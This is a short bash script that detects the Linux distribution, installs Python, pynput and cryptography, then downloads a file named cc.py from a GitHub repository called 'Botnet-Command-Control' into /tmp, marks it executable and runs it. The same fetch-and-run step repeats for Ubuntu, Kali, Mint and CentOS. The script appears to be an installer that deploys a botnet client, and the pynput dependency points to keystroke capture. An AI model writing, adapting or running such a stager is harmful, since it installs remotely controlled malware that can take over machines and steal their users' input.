#!/bin/bash

VERSION=$(lsb_release -a)
UBUNTU='Ubuntu'
KALI='Kali'
MINT='Mint'
CENT='CENTOS'

if [[ "$VERSION" == *"$UBUNTU"* ]];
then
    sudo apt-get install python3.6
    sudo apt-get install python3-pip
    pip3 install pynput
    pip3 install cryptography
    sudo apt-get install wget
    cd /tmp/
    wget https://raw.githubusercontent.com/binexisHATT/Botnet-Command-Control/master/scripts/net/cc.py
    chmod +x /tmp/cc.py
    /tmp/cc.py
fi

if [[ "$VERSION" == *"$KALI"* ]];
then
    sudo apt install python3.6
    sudo apt install python3-pip
    sudo apt install wget
    pip3 install pynput
    pip3 install cryptography
    cd /tmp/
    wget https://raw.githubusercontent.com/binexisHATT/Botnet-Command-Control/master/scripts/net/cc.py
    chmod +x /tmp/cc.py
    /tmp/cc.py
fi

if [[ "$VERSION" == *"$MINT"* ]];
then
    sudo apt install python3.6
    sudo apt install python3-pip
    sudo apt install wget
    pip3 install pynput
    pip3 install cryptography
    cd /tmp/
    wget https://raw.githubusercontent.com/binexisHATT/Botnet-Command-Control/master/scripts/net/cc.py
    chmod +x /tmp/cc.py
    /tmp/cc.py
fi


if [[ "$VERSION" == *"$CENT"* ]]; # lsb_release may not be installed, if so this statement will not be able to check your version
then
    sudo yum install python3 # may already be installed
    sudo yum install python3-pip # may already be installed
    sudo yum install wget
    pip3 install pynput # may need to switch to root to install this package
    pip3 install cryptography
    cd /tmp/
    wget https://raw.githubusercontent.com/binexisHATT/Botnet-Command-Control/master/scripts/net/cc.py
    chmod +x /tmp/cc.py
    /tmp/cc.py
fi
